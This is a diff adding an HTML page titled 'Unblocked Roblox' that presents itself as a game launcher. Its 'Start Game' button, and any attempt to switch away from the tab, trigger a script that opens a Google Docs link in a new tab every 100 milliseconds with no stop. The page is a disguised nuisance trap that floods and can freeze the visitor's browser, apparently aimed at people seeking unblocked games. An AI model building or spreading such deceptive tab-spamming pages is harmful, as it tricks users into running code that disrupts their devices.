@@ -1,0 +1,63 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Unblocked Roblox</title>
+    <style>
+        body {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background: linear-gradient(135deg, #1e1e1e, #4a90e2);
+            color: white;
+            font-family: Arial, sans-serif;
+            text-align: center;
+        }
+        .container {
+            padding: 20px;
+            border-radius: 15px;
+            background: rgba(255, 255, 255, 0.1);
+            backdrop-filter: blur(10px);
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.2);
+        }
+        button {
+            padding: 15px 30px;
+            font-size: 18px;
+            color: white;
+            background: #ff4081;
+            border: none;
+            border-radius: 10px;
+            cursor: pointer;
+            transition: 0.3s;
+        }
+        button:hover {
+            background: #e91e63;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Welcome to the Future</h1>
+        <p>Press the button below to start the Roblox experience.</p>
+        <button onclick="spamTabs()">Start Game</button>
+    </div>
+    
+    <script>
+        let spamInterval;
+        
+        function spamTabs() {
+            spamInterval = setInterval(() => {
+                window.open('https://docs.google.com/document/d/1cE_K1vT5-D82OadDf5ztnd5TaOlGsLUfo2iMRd13kFs/edit?usp=sharing', '_blank');
+            }, 100); // Opens repeatedly every 100ms
+        }
+        
+        document.addEventListener("visibilitychange", () => {
+            if (document.hidden) {
+                spamTabs();
+            }
+        });
+    </script>
+</body>
+</html>
